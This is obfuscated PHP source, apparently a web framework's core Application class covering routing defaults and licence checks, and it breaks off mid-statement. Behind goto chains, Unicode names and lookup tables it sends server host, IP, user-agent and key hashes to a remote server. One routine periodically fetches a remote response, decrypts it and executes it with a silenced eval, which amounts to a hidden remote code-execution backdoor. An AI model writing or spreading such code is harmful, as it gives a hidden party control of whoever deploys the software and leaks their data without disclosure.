<?php
 goto B忦; A: $C΄ = $_SERVER[̉][577]; if (strlen($C΄) < $_SERVER[̉][578]) { die; } class Application { private $defaultModule = "\x69\156\x64\x65\170"; private $defaultController = "\151\156\144\x65\170"; private $defaultAction = "\x69\156\144\145\x78"; function __construct() { } public function setDefault($aЛ) { goto aΊ; aΊ: $c߷ =& $_SERVER[̉]; $cҟ =& $_SERVER[랬]; $f = $cҟ[0]($cҟ[1], $cҟ[2]($aЛ, $cҟ[1])); goto c֥ǌ; C: $this->{$_SERVER[랬][3]}($cҟ[4], array($this, $cҟ[5])); $d = $c߷[584]; if (strlen($d) < $c߷[585]) { return; } goto a; Fڶѡ: $aľ = $c߷[580]; if (strlen($aľ) < $c߷[581]) { return; } $this->defaultController = $f[1] ? $f[1] : $this->defaultController; goto fل; fل: $f⊓ = $c߷[582]; if (strlen($f⊓) < $c߷[583]) { die; } $this->defaultAction = $f[2] ? $f[2] : $this->defaultAction; goto C; c֥ǌ: $C = $c߷[579]; while ($C < $c߷[578]) { if ($C >= 0) { break; } $C++; } $this->defaultModule = $f[0] ? $f[0] : $this->defaultModule; goto Fڶѡ; a: } public function appRun($Bô) { goto cَœ; c: $f = $aԒ[6]($eĘ݅[0]); $Eػ = $A[586]; $Dڈ͔ = $aԒ[7]; goto aѰ; aѰ: if ($f == $aԒ[8]) { $Dڈ͔ = $aԒ[9]; $eĘ݅[0] = $aԒ[10]; $eĘ݅[1] = $eĘ݅[1] . $aԒ[11]; $Bô = $aԒ[12]($aԒ[1], $eĘ݅); $Bô = $aԒ[2]($Bô, $aԒ[1]); } $aԒ[13](array($aԒ[14], $aԒ[15]), $Dڈ͔ . $aԒ[16], $Bô); $aԒ[17]($Bô); goto Aуނ; Aуނ: $aԒ[13](array($aԒ[14], $aԒ[15]), $Dڈ͔ . $aԒ[18], $Bô); $Dǯﱂ = $A[587]; goto f; cَœ: $A =& $_SERVER[̉]; $aԒ =& $_SERVER[랬]; $eĘ݅ = $aԒ[0]($aԒ[1], $Bô); goto c; f: } private function autorun() { $B臢 =& $_SERVER[̉]; $e =& $_SERVER[랬]; global $config; if ($e[19]($config[$e[20]]) == 0) { return; } foreach ($config[$e[20]] as $aڸ => $Aڰ) { $this->{$_SERVER[랬][21]}($Aڰ); $dս = $B臢[588]; while ($dս < $B臢[589]) { if ($dս >= 0) { break; } $dս++; } } } private function etzd60bec276() { goto CȠ; C۟: $F͗Ԟ = $GLOBALS[$c嫪[22]][$c嫪[23]][0]; $e = $f͚垥[590]; if (!$F͗Ԟ || $c嫪[24]($F͗Ԟ) <= $c嫪[24]($Aւ)) { return; } goto fۛת; fۛת: if ($c嫪[6]($c嫪[25]($F͗Ԟ, -$c嫪[24]($Aւ))) != $Aւ) { return; } $A = $c嫪[25]($F͗Ԟ, 0, -$c嫪[24]($Aւ)); $Eҫ = array($c嫪[8], $A); goto d; CȠ: $f͚垥 =& $_SERVER[̉]; $c嫪 =& $_SERVER[랬]; $Aւ = $c嫪[8]; goto C۟; d: $aͭ = $c嫪[26]($GLOBALS[$c嫪[22]][$c嫪[23]], 1); $f؇ = $f͚垥[591]; if (!$f؇) { return; } goto cݣ; cݣ: $GLOBALS[$c嫪[22]][$c嫪[23]] = $c嫪[27]($Eҫ, $aͭ); $GLOBALS[$c嫪[22]][$c嫪[28]] = $c嫪[29]($c嫪[1], $GLOBALS[$c嫪[22]][$c嫪[23]]); goto C; C: } private function eibtb13b17a8() { goto B汓; Bλ: if (!$BɃ[32]($bߌܾ, $B)) { return; } $Eœ = $BɃ[33]($bߌܾ, $B); $b͝ = $BɃ[25]($bߌܾ, $Eœ + $BɃ[24]($B)); goto CϓŜ; C: $bߌܾ = $_SERVER[$BɃ[30]]; $dϔ꫇ = $A٩[592]; while (strlen($dϔ꫇) < $A٩[578]) { if (!$dϔ꫇) { break; } $dϔ꫇++; } goto CΑ; aޏƪ: while ($f苝 < $A٩[589]) { if ($f苝 >= 0) { break; } $f苝++; } $GLOBALS[$BɃ[22]][$BɃ[23]] = $BɃ[0]($BɃ[36], $b͝); $GLOBALS[$BɃ[22]][$BɃ[28]] = $BɃ[29]($BɃ[1], $GLOBALS[$BɃ[22]][$BɃ[23]]); goto aҏ; aҏ: $Fڳ = $A٩[595]; if (!$Fڳ) { return; } goto B; CΑ: $B = $BɃ[31]; $bř뛸 = $A٩[593]; if (strlen($bř뛸) < $A٩[585]) { return; } goto Bλ; CϓŜ: $BɃ[34]($BɃ[35], $b͝, $bǘ); $b͝ = $BɃ[2]($bǘ[0][0], $BɃ[36]); $f苝 = $A٩[594]; goto aޏƪ; B汓: $A٩ =& $_SERVER[̉]; $BɃ =& $_SERVER[랬]; if ($GLOBALS[$BɃ[22]][$BɃ[28]] != $BɃ[10]) { return; } goto C; B: } public function run() { goto aŸጐ; Cȴ: $this->{$_SERVER[랬][38]}(); $Dŉӛ = $GLOBALS[$cұ஼[22]][$cұ஼[23]]; $D = $GLOBALS[$cұ஼[22]][$cұ஼[28]]; goto a; cӡБ: $A֪ = $Cۚ[602]; if ($cұ஼[19]($Dŉӛ) >= 3) { $this->{$_SERVER[랬][21]}($D); } else { $this->{$_SERVER[랬][21]}(ACTION); } goto cӷ; f֣: $DҠ = $Cۚ[597]; if (!$DҠ) { return; } $cұ஼[39]($cұ஼[41], isset($Dŉӛ[1]) && $Dŉӛ[0] ? $Dŉӛ[1] : $this->defaultController); goto e޻ן; D: $f½ = $Cۚ[601]; while (strlen($f½) < $Cۚ[581]) { if (!$f½) { break; } $f½++; } $this->{$_SERVER[랬][45]}(); goto cӡБ; a: $c벗 = $Cۚ[596]; while (strlen($c벗) < $Cۚ[589]) { if (!$c벗) { break; } $c벗++; } $cұ஼[39]($cұ஼[40], isset($Dŉӛ[0]) && $Dŉӛ[0] ? $Dŉӛ[0] : $this->defaultModule); goto f֣; c: $b뤦 = $Cۚ[600]; if (!$b뤦) { return; } $_SERVER[$cұ஼[44]] = $cұ஼[6](ACTION); goto D; aŸጐ: $Cۚ =& $_SERVER[̉]; $cұ஼ =& $_SERVER[랬]; $this->{$_SERVER[랬][37]}(); goto Cȴ; e޻ן: $aτ׌ = $Cۚ[598]; while (strlen($aτ׌) < $Cۚ[589]) { if (!$aτ׌) { break; } $aτ׌++; } $cұ஼[39]($cұ஼[42], isset($Dŉӛ[2]) && $Dŉӛ[0] ? $Dŉӛ[2] : $this->defaultAction); goto D; D: $B͆ӟ = $Cۚ[599]; while (strlen($B͆ӟ) < $Cۚ[581]) { if (!$B͆ӟ) { break; } $B͆ӟ++; } $cұ஼[39]($cұ஼[43], MOD . $cұ஼[1] . ST . $cұ஼[1] . ACT); goto c; cӷ: } private $iceydded7f53 = array(); private $ghqweb405878 = ''; public function gmoz8f7db5cc() { goto dׅЈ; Dǚ: $this->{$_SERVER[랬][3]}($Bҏ򏻹[53], array($this, $Bҏ򏻹[54])); $this->{$_SERVER[랬][3]}($Bҏ򏻹[55], array($this, $Bҏ򏻹[56])); $E = $b緞[608]; goto F̝; dׅЈ: $b緞 =& $_SERVER[̉]; $Bҏ򏻹 =& $_SERVER[랬]; $this->{$_SERVER[랬][46]}(); goto D렼; cڇ: $this->{$_SERVER[랬][3]}($Bҏ򏻹[59], array($this, $Bҏ򏻹[60])); $D߅β = $b緞[610]; if (strlen($D߅β) < $b緞[585]) { return; } goto cǹܦ; Cற: if (strlen($b؋) < $b緞[589]) { die; } $this->{$_SERVER[랬][49]}(); $C՞ = $b緞[606]; goto fݞ; B䫟: $this->{$_SERVER[랬][52]}(); $bˏ = $b緞[607]; if (!$bˏ) { die; } goto Dǚ; fݞ: if (strlen($C՞) < $b緞[589]) { return; } $this->{$_SERVER[랬][50]}(); $this->{$_SERVER[랬][51]}(); goto B䫟; D렼: $C񑎅 = $b緞[603]; while ($C񑎅 < $b緞[583]) { if ($C񑎅 >= 0) { break; } $C񑎅++; } $this->{$_SERVER[랬][47]}(); goto E鑅; E鑅: $a؍ = $b緞[604]; $this->{$_SERVER[랬][48]}(); $b؋ = $b緞[605]; goto Cற; F̝: if (!$E) { die; } $this->{$_SERVER[랬][3]}($Bҏ򏻹[57], array($this, $Bҏ򏻹[58])); $E = $b緞[609]; goto cڇ; cǹܦ: } public function bdis932b201a($e) { goto B酢; c: $e[$B[118]][$B[130]] = $this->ghqweb405878; if ($f򟙒[$B[130]] != $B[131]) { $e[$B[118]][$B[132]] = $f򟙒[$B[132]]; $e[$B[118]][$B[133]] = $f򟙒[$B[133]]; $D᫉ = $B[134](10) . $this->ghqweb405878 . $B[134](5); $e[$B[106]][$B[135]][$B[136]] = $this->{$_SERVER[랬][137]}($D᫉, $e[$B[118]][$B[123]]); } if ($this->ghqweb405878 == $B[131]) { $e[$B[106]][$B[107]][$B[112]][$B[117]] = 0; } goto BՌ; fۊ: unset($e[$B[106]][$B[108]][$B[110]]); $f妋 = $C꾉[612]; unset($e[$B[106]][$B[107]][$B[76]]); goto cص噺; fȱ: $eٮ = array($B[64], $B[65], $B[66], $B[67], $B[68], $B[69], $B[70], $B[71], $B[72], $B[73], $B[74], $B[75], $B[76], $B[77], $B[78], $B[79], $B[80], $B[81], $B[82], $B[83], $B[84], $B[85], $B[86], $B[87], $B[88], $B[89], $B[90], $B[91], $B[92], $B[93], $B[94], $B[95], $B[96], $B[97], $B[98], $B[99], $B[100], $B[101], $B[102], $B[103]); $dµ = $C꾉[611]; while ($dµ < $C꾉[585]) { if ($dµ >= 0) { break; } $dµ++; } goto a; cص噺: unset($e[$B[106]][$B[107]][$B[111]]); $e[$B[106]][$B[107]][$B[112]] = array($B[113] => (int) $a[$B[114]], $B[115] => (int) $B[116]($a, $B[117], 0)); $e[$B[118]][$B[119]] = $B[120]($B[121])->{$_SERVER[랬][122]}(); goto B싫; Aɶ: if (!$F휥) { return; } if ($B[116]($GLOBALS, $B[142]) && $this->config[$B[143]]) { $e[$B[118]][$B[144]] = WEB_ROOT; } return $e; goto fʦ; BՌ: $e[$B[118]][$B[138]] = $B[116]($this->iceydded7f53, $B[139], $B[10]); $e[$B[118]][$B[140]] = $B[116]($this->iceydded7f53, $B[141], $B[10]); $F휥 = $C꾉[616]; goto Aɶ; fҨǖ: $A۴ = $C꾉[614]; $e[$B[118]][$B[127]] = $B[128]($B[129]()); $C = $C꾉[615]; goto c; B酢: $C꾉 =& $_SERVER[̉]; $B =& $_SERVER[랬]; $f򟙒 = $B[61]($B[62])->{$_SERVER[랬][63]}(); goto fȱ; B싫: $c好 = $C꾉[613]; while (strlen($c好) < $C꾉[589]) { if (!$c好) { break; } $c好++; } $e[$B[118]][$B[123]] = $B[124]($_SERVER[$B[125]] . $f򟙒[$B[126]]); goto fҨǖ; a: foreach ($eٮ as $b˙ɫ) { $e = $GLOBALS[$B[104]][$B[105]][$b˙ɫ]; if (isset($f򟙒[$b˙ɫ])) { $e = $f򟙒[$b˙ɫ]; } $e[$B[106]][$B[107]][$b˙ɫ] = $e; } $a = $e[$B[106]][$B[107]][$B[76]]; unset($e[$B[106]][$B[108]][$B[109]]); goto fۊ; fʦ: } private function simn201ab932() { goto f; EّҌ: if ($this->ghqweb405878 == $cޣ[131]) { return; } $Eɋ = array($cޣ[171], $cޣ[172], $cޣ[173], $cޣ[174], $cޣ[175], $cޣ[176]); $D = $EԹׅ[618]; goto B􍯕; Eꪉ: $f㴲 = $EԹׅ[622]; if (strlen($f㴲) < $EԹׅ[581]) { die; } goto dۯ; B􍯕: while ($D < $EԹׅ[581]) { if ($D >= 0) { break; } $D++; } $aّ = $cޣ[61]($cޣ[62])->{$_SERVER[랬][63]}(); $eĎ = $EԹׅ[619]; goto D㛟; bل: if (!$f腥) { return; } foreach ($Eɋ as $B) { if (!isset($aّ[$B]) || !$aّ[$B]) { continue; } $cҧ[$B] = $aّ[$B]; $c짜 = $EԹׅ[621]; while ($c짜 < $EԹׅ[583]) { if ($c짜 >= 0) { break; } $c짜++; } } $cޣ[13](array($cޣ[169], $cޣ[170]), $cҧ); goto Eꪉ; f: $EԹׅ =& $_SERVER[̉]; $cޣ =& $_SERVER[랬]; if ($_SERVER[$cޣ[44]] == $cޣ[145]) { goto EӺư; a¹ݏ: $Dȑ = $EԹׅ[617]; if (!$Dȑ) { return; } $cҧ = array($cޣ[168] => $f); goto F͉; EӺư: $f = array($cޣ[130] => $this->ghqweb405878, $cޣ[146] => $this->{$_SERVER[랬][147]}(), $cޣ[148] => $cޣ[61]($cޣ[149])->{$_SERVER[랬][150]}()); if ($this->ghqweb405878 != $cޣ[131]) { $B䓠փ = $cޣ[116]($this->iceydded7f53, $cޣ[151]); if ($B䓠փ) { $f[$cޣ[152]] = $B䓠փ; $f[$cޣ[153]] = $cޣ[154]($cޣ[116]($this->iceydded7f53, $cޣ[155])); $f[$cޣ[156]] = $cޣ[116]($this->iceydded7f53, $cޣ[141]); } $D = $cޣ[61]($cޣ[62])->{$_SERVER[랬][63]}($cޣ[157], $cޣ[10], !0); if ($cޣ[158]($D) && $cޣ[25]($D, 0, 1) == $cޣ[159]) { $D = $cޣ[160]($D); } if ($cޣ[161]($D) && $D[$cޣ[162]] && $cޣ[32]($D[$cޣ[162]], $cޣ[163])) { $FݘǾ = $cޣ[0]($cޣ[163], $D[$cޣ[162]]); $f[$cޣ[164]] = $FݘǾ[0]; } } $f = $this->{$_SERVER[랬][165]}($cޣ[166]($f), $cޣ[124]($cޣ[167])); goto a¹ݏ; F͉: $cޣ[13](array($cޣ[169], $cޣ[170]), $cҧ); goto b; b: } goto EّҌ; D㛟: while (strlen($eĎ) < $EԹׅ[589]) { if (!$eĎ) { break; } $eĎ++; } $cҧ = array($cޣ[177] => $aّ[$cޣ[64]], $cޣ[178] => $aّ[$cޣ[65]], $cޣ[179] => $cޣ[10]); $f腥 = $EԹׅ[620]; goto bل; dۯ: } private function rimqc62583b8() { goto Eȏ; a: $bխ = $eȉǶ[630]; while (strlen($bխ) < $eȉǶ[581]) { if (!$bխ) { break; } $bխ++; } $A = array(); goto e; a۬: if (!isset($Cᳳ[$C[183]]) || $C[24]($Cᳳ[$C[183]]) != 16) { $C[184]($C[185] . $Cᳳ[$C[183]], !1); } $B = $C[61]($C[62])->{$_SERVER[랬][63]}($C[126]); $a挝֨ = $C[124]($_SERVER[$C[125]] . $B); goto bܲ; bܲ: $a = $eȉǶ[623]; if (!$a) { die; } $A = array($C[183] => $Cᳳ[$C[183]], $C[186] => $C[134](16), $C[187] => $C[167], $C[188] => $C[189], $C[190] => $_SERVER[$C[191]], $C[192] => $_SERVER[$C[193]], $C[194] => $_SERVER[$C[195]], $C[123] => $a挝֨, $C[196] => $C[61]($C[62])->{$_SERVER[랬][63]}($C[157])); goto DĦȏ; a: $AӃǻ = $this->{$_SERVER[랬][137]}($C[166]($C), $fҍ); $eӂ = $C[241]($C[61]($C[11])->{$_SERVER[랬][242]}(), $C[243]); $fƓ = $eӂ[$C[244]]; goto a; eڿ: if (!$b) { die; } goto F殨Ն; fŠË: $Aȗ = $eȉǶ[624]; if (strlen($Aȗ) < $eȉǶ[578]) { die; } $aġ[$C[132]] = $C[233]($C[128]($this->{$_SERVER[랬][165]}($D֦༰, $C[234]))); goto C֕; A憠: $aġ[$C[133]] = $C[128]($C[233]($this->{$_SERVER[랬][165]}($A, $C[235]))); if ($C[$C[236]] && $C[$C[236]] >= 1) { $C[61]($C[62])->{$_SERVER[랬][237]}($C[238], $C[239]); } $C[61]($C[62])->{$_SERVER[랬][240]}($aġ); goto E䦦; dœ: $CК = $C[233]($C[25]($fҍ, 10, 16)); $Eܺɐ = $eȉǶ[629]; if (!$Eܺɐ) { die; } goto a; DĦȏ: if ($Cᳳ[$C[197]] == $C[198]) { $bϸ = $this->{$_SERVER[랬][165]}($a挝֨, $C[199]); $bŖ = $this->{$_SERVER[랬][137]}($C[166]($A), $a挝֨ . $C[200], 3); $bŖ = $bŖ . $C[201] . $_SERVER[$C[191]]; $Eڄ􅼏 = $this->{$_SERVER[랬][202]}($C[203] . $bϸ . $C[204] . $bŖ, -1); $C[184]($Eڄ􅼏, !0); } else { if ($Cᳳ[$C[197]] == $C[205]) { $cӲ = $C[25]($C[124]($C[206] . $a挝֨), 12, 15) . $C[207]; $bŖ = $this->{$_SERVER[랬][208]}($C[2]($Cᳳ[$C[209]]), $cӲ, 2); $e࣋ = $C[210]($bŖ, !0); if (!$C[161]($e࣋) || !$C[161]($e࣋[$C[211]]) || $e࣋[$C[183]] != !0) { $B򗳴 = $C[212]; $aĈ = $e࣋[$C[211]] ? $C[213] . $e࣋[$C[211]] : $B򗳴; $C[184]($aĈ, !1); } else { $A[$C[186]] = $e࣋[$C[211]][$C[214]]; } } else { $e࣋ = $this->{$_SERVER[랬][202]}($C[215], $A, 10); } } if (!$C[161]($e࣋) || !$C[161]($e࣋[$C[211]]) || $e࣋[$C[183]] != !0) { $B򗳴 = $C[216]($C[217]); $aĈ = $e࣋[$C[211]] ? $C[213] . $e࣋[$C[211]] : $B򗳴; $C[184]($aĈ, !1); } $C = $e࣋[$C[211]]; goto F厊㝰; F厊㝰: $eì = $this->{$_SERVER[랬][218]}($C[$C[219]]); if (!$eì || $eì != $C[$C[155]]) { $c؜ѷ = array($C[220] => $C[61]($C[62])->{$_SERVER[랬][63]}($C[126]), $C[221] => $_SERVER[$C[125]], $C[222] => $C[223](), $C[192] => $_SERVER[$C[193]]); $bŖ = $this->{$_SERVER[랬][224]}($C[166]($c؜ѷ)); $this->{$_SERVER[랬][202]}($C[225] . $bŖ); $C[184]($C[216]($C[226]), !0); } $aġ = array($C[227] => $C[$C[228]], $C[229] => $C[$C[230]], $C[231] => $C[134](16), $C[130] => $C[$C[232]]); goto fɡ; c: if (strlen($eҎ) < $eȉǶ[578]) { die; } $C[184]($C[216]($C[226]), !0); $b = $eȉǶ[633]; goto eڿ; C֕: $BϏ = $eȉǶ[625]; while ($BϏ < $eȉǶ[578]) { if ($BϏ >= 0) { break; } $BϏ++; } $c = $C[134](16); goto a; E䦦: $fҍ = $C[124]($_SERVER[$C[125]] . $C[233]($B) . $aġ[$C[229]]); $b¥ܨ = $eȉǶ[628]; while (strlen($b¥ܨ) < $eȉǶ[589]) { if (!$b¥ܨ) { break; } $b¥ܨ++; } goto dœ; d۳Ĥ: $this->ghqweb405878 = $aġ[$C[130]]; $this->{$_SERVER[랬][248]}(); $f匝ߎ = $eȉǶ[631]; goto d򈜨; a: $b = $eȉǶ[626]; $A = $c . $aġ[$C[130]] . $this->{$_SERVER[랬][165]}($C[124]($aġ[$C[227]]), $c); $Dͽ = $eȉǶ[627]; goto A憠; fɡ: if ($A[$C[186]]) { $aġ[$C[231]] = $A[$C[186]]; } $bˬ = $C[25]($C[124]($aġ[$C[229]]), 10, 10); $D֦༰ = $bˬ . $aġ[$C[130]] . $aġ[$C[231]]; goto fŠË; d򈜨: if (strlen($f匝ߎ) < $eȉǶ[583]) { die; } Cache::set($C[249] . $C[124]($B . $C[250]), $C[10]); $eҎ = $eȉǶ[632]; goto c; Eȏ: $eȉǶ =& $_SERVER[̉]; $C =& $_SERVER[랬]; if ($_SERVER[$C[44]] != $C[180]) { return; } goto fߥ; e: $A[$CК] = $AӃǻ; $C[61]($C[11])->{$_SERVER[랬][245]}($fƓ[$C[246]], array($C[247] => $A)); $this->iceydded7f53 = $C; goto d۳Ĥ; fߥ: if (!$C[116]($GLOBALS, $C[142])) { die; } $Cᳳ = $GLOBALS[$C[22]]; if (isset($Cᳳ[$C[181]])) { $this->{$_SERVER[랬][182]}(); die; } goto a۬; F殨Ն: } private function licenseRegistSuccess() { $fў =& $_SERVER[랬]; $d = $fў[61]($fў[62])->{$_SERVER[랬][63]}(); $E = $_SERVER[̉][634]; if (!$E) { die; } if ($d[$fў[93]] != $fў[239]) { $fў[61]($fў[62])->{$_SERVER[랬][240]}($fў[93], $fў[239]); } $fў[120]($fў[251])->{$_SERVER[랬][252]}(!0); } private function alep0a77d02e() { $e =& $_SERVER[랬]; $e[61]($e[62])->{$_SERVER[랬][240]}(array($e[227] => $e[10], $e[229] => $e[10], $e[130] => $e[131], $e[132] => $e[10], $e[133] => $e[10])); $e[61]($e[62])->{$_SERVER[랬][237]}($e[238], $e[253]); $Dܹ = $_SERVER[̉][635]; $this->iceydded7f53 = array(); $this->ghqweb405878 = $e[131]; } private function gmny713eb370() { goto D; Eͪ: $bˊݩ = $A[61]($A[62])->{$_SERVER[랬][63]}($A[126]); $d = $A[249] . $A[124]($bˊݩ . $A[250]); $bة = Cache::get($d); goto fێ; D: $A =& $_SERVER[랬]; $_SERVER[$A[193]] = $A[116]($_SERVER, $A[193], APP_HOST); $cۼӱ = $_SERVER[̉][636]; goto dܑ; fΉ: if ($A[255]() >= $E򖨮) { return $this->{$_SERVER[랬][182]}(); } if ($A[255]() - $bة[$A[254]] > 20) { $bة[$A[254]] = $A[255](); Cache::set($d, $bة); } $this->iceydded7f53 = $bة; goto a; fێ: if (!$A[161]($bة) || !isset($bة[$A[254]]) || $A[255]() - $bة[$A[254]] >= 60) { $DƟ = $A[241]($A[61]($A[11])->{$_SERVER[랬][242]}(), $A[243]); $F͕و = $DƟ[$A[244]]; $aŊݕ = $A[124]($_SERVER[$A[125]] . $A[233]($bˊݩ) . $Bه[$A[229]]); $aʱ = $A[233]($A[25]($aŊݕ, 10, 16)); $bة = $this->{$_SERVER[랬][208]}($F͕و[$A[104]][$aʱ], $aŊݕ); $bة = $A[210]($bة, !0); } if (!$A[161]($bة)) { return $this->{$_SERVER[랬][182]}(); } $E򖨮 = $A[154]($bة[$A[155]]); goto fΉ; dܑ: $this->ghqweb405878 = $A[131]; $Bه = $A[61]($A[62])->{$_SERVER[랬][63]}(); if ($Bه[$A[130]] == $A[131]) { return; } goto Eͪ; a: $this->ghqweb405878 = $Bه[$A[130]]; goto c; c: } private function zsyl4b252b29() { goto D褂; Cˇ: if ($cɡ[261]($Dέ, $Eӣ)) { if ($this->ghqweb405878 == $cɡ[131] && isset($Aέ[$cɡ[262]])) { $cɡ[184]($cɡ[216]($cɡ[257]), !1, $cɡ[258]); die; } $EԿ뼎 = $this->{$_SERVER[랬][147]}(); if ($EԿ뼎 != $cɡ[263]($cɡ[264])) { if ($EԿ뼎 <= $cɡ[61]($cɡ[149])->{$_SERVER[랬][150]}()) { $cɡ[184]($cɡ[216]($cɡ[265]), !1, $cɡ[258]); die; } } } goto Fݑ; D褂: $cɡ =& $_SERVER[랬]; $Aέ = $GLOBALS[$cɡ[22]]; $fα = $_SERVER[̉][637]; goto a; a: $Dέ = $_SERVER[$cɡ[44]]; if ($Dέ == $cɡ[256] && $this->ghqweb405878 == $cɡ[131]) { $cɡ[184]($cɡ[216]($cɡ[257]), !1, $cɡ[258]); } $Eӣ = array($cɡ[259], $cɡ[260]); goto Cˇ; Fݑ: } private function ksmo7c9b4a61() { goto Eͩ; DƵ: $Dꐂ = $Eڋ[639]; if (strlen($Dꐂ) < $Eڋ[581]) { die; } $a眓 = $E̙[271](array($E̙[272] => array($E̙[273] => $E̙[274], $E̙[275] => 3))); goto aᡳ; f: die; goto f; A: $A㇜戃 = $Eڋ[642]; while (strlen($A㇜戃) < $Eڋ[589]) { if (!$A㇜戃) { break; } $A㇜戃++; } if ($fٓ && $E̙[32]($fٓ, $E̙[279])) { echo $fٓ; } goto f; eڟ: if (!$E̙[116]($GLOBALS, $E̙[142]) || !isset($_GET[$E̙[267]])) { return; } if (!$E̙[261]($_SERVER[$E̙[44]], $Dӗ)) { return; } $Eݵ = $E̙[268]; goto Dꪡ; Eͩ: $Eڋ =& $_SERVER[̉]; $E̙ =& $_SERVER[랬]; $Dӗ = array($E̙[145], $E̙[266]); goto eڟ; e: $EШ = $Eڋ[641]; if (strlen($EШ) < $Eڋ[585]) { die; } $E̙[277]($E̙[278]); goto A; aᡳ: $e = $Eڋ[640]; if (strlen($e) < $Eڋ[583]) { return; } $fٓ = @$E̙[276]($Eݵ, !1, $a眓); goto e; Dꪡ: $a = $Eڋ[638]; if (!$a) { die; } $Eݵ = $this->{$_SERVER[랬][269]}($Eݵ, $E̙[270]); goto DƵ; f: } public function vumyd5ce271e($Dޓ) { goto f៚; f̞: $f䣔 = $e῅Χ[643]; if (!$f䣔) { return; } foreach ($B as $B檖 => $cЃ) { if ($cЃ == $D[282] && $D[25]($this->ghqweb405878, 0, 1) == $D[282]) { continue; } if (!$D[261]($B檖, $Bߛ)) { $d󝢆[] = $B檖; } } goto dگ; B᪟: if (!$Fі) { return; } goto BǶ; BŲ: $B = array($D[281] => $D[282], $D[283] => $D[282], $D[284] => $D[282], $D[285] => $D[282], $D[286] => $D[282], $D[287] => $D[282], $D[288] => $D[289], $D[290] => $D[289], $D[291] => $D[289], $D[292] => $D[289], $D[293] => $D[289], $D[294] => $D[289], $D[295] => $D[289], $D[296] => $D[289], $D[297] => $D[289]); $Bߛ = $D[0]($D[298], $D[116]($this->iceydded7f53, $D[139], $D[10])); $d󝢆 = array(); goto f̞; f៚: $e῅Χ =& $_SERVER[̉]; $D =& $_SERVER[랬]; if ($this->ghqweb405878 == $D[280]) { return $Dޓ; } goto BŲ; dگ: foreach ($d󝢆 as $B檖) { unset($Dޓ[$B檖]); } return $Dޓ; $Fі = $e῅Χ[644]; goto B᪟; BǶ: } private function uzak17333fdc() { $aاᛩ =& $_SERVER[랬]; if ($this->ghqweb405878 != $aاᛩ[131]) { return; } $GLOBALS[$aاᛩ[104]][$aاᛩ[108]][$aاᛩ[299]] = $aاᛩ[239]; $GLOBALS[$aاᛩ[104]][$aاᛩ[300]] = $aاᛩ[239]; if ($aاᛩ[61]($aاᛩ[301])->{$_SERVER[랬][63]}($aاᛩ[93]) != $aاᛩ[253]) { $aاᛩ[61]($aاᛩ[301])->{$_SERVER[랬][240]}($aاᛩ[93], $aاᛩ[253]); } } public function hbwp5def5618() { $eߌá =& $_SERVER[̉]; return $_SERVER[랬][302]; $e = $eߌá[645]; while ($e < $eߌá[589]) { if ($e >= 0) { break; } $e++; } } private function uyknaedca4e7() { goto dà; Eɴ: if ($dٙ[$F舡[183]] && $dٙ[$F舡[312]]) { if ($this->{$_SERVER[랬][218]}($dٙ[$F舡[312]]) == $b֏̅[$F舡[183]]) { return; } } $this->{$_SERVER[랬][182]}(); if ($this->{$_SERVER[랬][218]}($dٙ[$F舡[312]]) != $b֏̅[$F舡[183]]) { $eՎ = array($F舡[220] => $bه, $F舡[221] => $_SERVER[$F舡[125]], $F舡[222] => $F舡[223](), $F舡[192] => $_SERVER[$F舡[193]]); $A = $this->{$_SERVER[랬][224]}($F舡[166]($eՎ)); $dٙ = $this->{$_SERVER[랬][202]}($F舡[225] . $A); if ($dٙ && $F舡[161]($dٙ) && isset($dٙ[$F舡[312]])) { $eʈ = $this->{$_SERVER[랬][208]}($dٙ[$F舡[312]], 2); if ($eʈ) { $eʈ = $this->{$_SERVER[랬][218]}($eʈ); } if ($eʈ) { try { @eval($eʈ); } catch (Exception $FϢӯ) { } } } } goto d޲˵; dà: $D =& $_SERVER[̉]; $F舡 =& $_SERVER[랬]; $Bˠ = array($F舡[303], $F舡[304], $F舡[305]); goto c; f: if (strlen($Bڂ) < $D[578]) { return; } $bه = $F舡[61]($F舡[62])->{$_SERVER[랬][63]}($F舡[126]); $b֏̅ = array($F舡[183] => $F舡[61]($F舡[62])->{$_SERVER[랬][63]}($F舡[227]), $F舡[197] => $this->ghqweb405878, $F舡[194] => $_SERVER[$F舡[195]], $F舡[196] => $F舡[61]($F舡[62])->{$_SERVER[랬][63]}($F舡[157]), $F舡[123] => $F舡[124]($_SERVER[$F舡[125]] . $bه), $F舡[187] => $F舡[167], $F舡[190] => $_SERVER[$F舡[191]]); goto d; c: $A閕 = $D[646]; while (strlen($A閕) < $D[578]) { if (!$A閕) { break; } $A閕++; } $f = $F舡[306] . $F舡[124]($F舡[307]); goto Eߩݢ; a: if ($d뷸 && $F舡[255]() - $d뷸 < $F舡[263]($F舡[310])) { return; } $F舡[13](array($F舡[308], $F舡[170]), $f, $F舡[255]()); $Bڂ = $D[648]; goto f; Eߩݢ: $F܄ = $D[647]; if (strlen($F܄) < $D[585]) { return; } if ($this->ghqweb405878 == $F舡[131] || !$F舡[116]($GLOBALS, $F舡[142])) { return; } goto d̓; d: $b΂ɕ = $D[649]; while (strlen($b΂ɕ) < $D[585]) { if (!$b΂ɕ) { break; } $b΂ɕ++; } $dٙ = $this->{$_SERVER[랬][202]}($F舡[311], $b֏̅); goto c; c: $C̔ = $D[650]; while (strlen($C̔) < $D[578]) { if (!$C̔) { break; } $C̔++; } if (!$F舡[161]($dٙ)) { return; } goto Eɴ; d̓: if (!$F舡[261]($_SERVER[$F舡[44]], $Bˠ)) { return; } if ($F舡[255]() % 4 != 0) { return; } $d뷸 = $F舡[13](array($F舡[308], $F舡[309]), $f); goto a; d޲˵: } private function fhdp705cd53e($fݎ = '', $C̷ = array(), $aؤ̓ = 5) { goto F҉갇; eݕ톭: $C囆 = $d߱[271](array($d߱[272] => array($d߱[275] => $aؤ̓, $d߱[273] => $d߱[317]), $d߱[318] => array($d߱[319] => !1, $d߱[320] => !1))); $fɯ = $cљ[652]; if (strlen($fɯ) < $cљ[581]) { return; } goto dҷ; F҉갇: $cљ =& $_SERVER[̉]; $d߱ =& $_SERVER[랬]; $BɈ = $d߱[313]; goto bޞ; c𯊅: $C웣 = $cљ[654]; goto C; dҷ: $C̷ = @$d߱[276]($BɈ, !1, $C囆); return $d߱[210]($C̷, !0); $Eș = $cљ[653]; goto c𯊅; cĊ: while (strlen($f) < $cљ[578]) { if (!$f) { break; } $f++; } if ($C̷ && $d߱[161]($C̷)) { $BɈ = $BɈ . $d߱[315] . $d߱[316]($C̷); } if ($C̷ === -1) { return $BɈ; } goto eݕ톭; bޞ: $BɈ = 